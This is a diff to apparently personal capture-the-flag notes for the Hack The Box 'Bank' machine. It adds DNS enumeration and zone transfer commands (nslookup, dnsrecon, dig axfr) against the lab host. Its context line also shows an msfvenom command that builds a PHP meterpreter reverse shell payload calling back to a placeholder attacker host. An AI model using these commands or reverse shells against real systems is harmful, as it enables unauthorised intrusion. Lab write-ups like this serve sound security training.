@@ -1,5 +1,6 @@
 #### Enumeration
 - Open Ports port `port 22, 53,80`
+- When DNS port is open on TCP, high chances of `zone transfer`
 - No information gathered from the DNS Server
 - Virtual host is guessed `bank.htb` and added to the `/etc/hosts`
 - `balance-transfer` directory enumerated
@@ -24,3 +25,39 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=<your-ip> lport=<listening port> -
 
 #### Priv Esc
 - On running the `emergency` binary, the user is escalated to root group and root shell is obtained
+
+
+
+#### Commands:
+
+**DNS port Poking**
+```bash
+nslookup
+> SERVER 10.10.10.29
+# ask for who is localhost 127.0.0.1 Possiblities might expose a new host
+> 127.0.0.1
+# reverse lookup
+> 10.10.10.29
+# guessing the host name and it responds
+> bank.htb
+```
+
+**DNS Recon**
+```bash
+# gathers all the host from 127.0.0.0 - 127.0.0.255 in the name server 10.10.10.29
+dnsrecon -r 127.0.0.0/24 -n 10.10.10.29
+# some host file may be included in 127.0.1.0 - 127.0.1.255
+# If the 24 is replaced wirth `127.0.0.0/16` range will be from 127.0.0.0 - 127.0.255.255, if 8, 3 octacs will be checked
+dnsrecon -r 127.0.1.0/24 -n 10.10.10.29
+# On the 10 subnet
+dnsrecon -r 10.10.10.0/24 -n 10.10.10.29
+```
+
+**DNS Zone Transfer**
+
+```bash
+# zone transfer without specifing a domain
+dig axfr @10.10.10.29
+# zone transfer on specifying the domain
+dig axfr bank.htb @10.10.10.29
+```
